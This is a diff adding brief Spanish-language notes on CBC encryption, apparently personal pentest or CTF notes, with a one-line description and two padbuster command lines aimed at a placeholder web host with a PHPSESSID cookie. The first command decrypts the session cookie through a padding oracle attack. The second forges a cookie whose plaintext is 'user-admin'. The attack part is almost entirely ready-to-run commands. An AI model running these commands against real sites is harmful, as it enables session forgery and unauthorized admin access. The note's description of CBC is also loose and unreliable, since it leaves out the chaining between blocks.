@@ -1,0 +1,10 @@
+
+#! Cifrado CBC
+                el texto claro se divide en varios bloques/bytes, se utilizada una clave para encriptar cada bloque
+
+
+::: padbuster http://ipWebHere/index.php   2tq4ebhtldrrbb2504pmgri7ik    8     -cookie "PHPSESSID=4ebhtldrrbb2504pmgri7ik"   -encoding 0  
+                                             cookieDeSession         numberBloquesBytes             
+
+
+::: padbuster http://ipWebHere/index.php   2tq4ebhtldrrbb2504pmgri7ik    8     -cookie "PHPSESSID=4ebhtldrrbb2504pmgri7ik"   -encoding 0    -plaintext "user-admin"
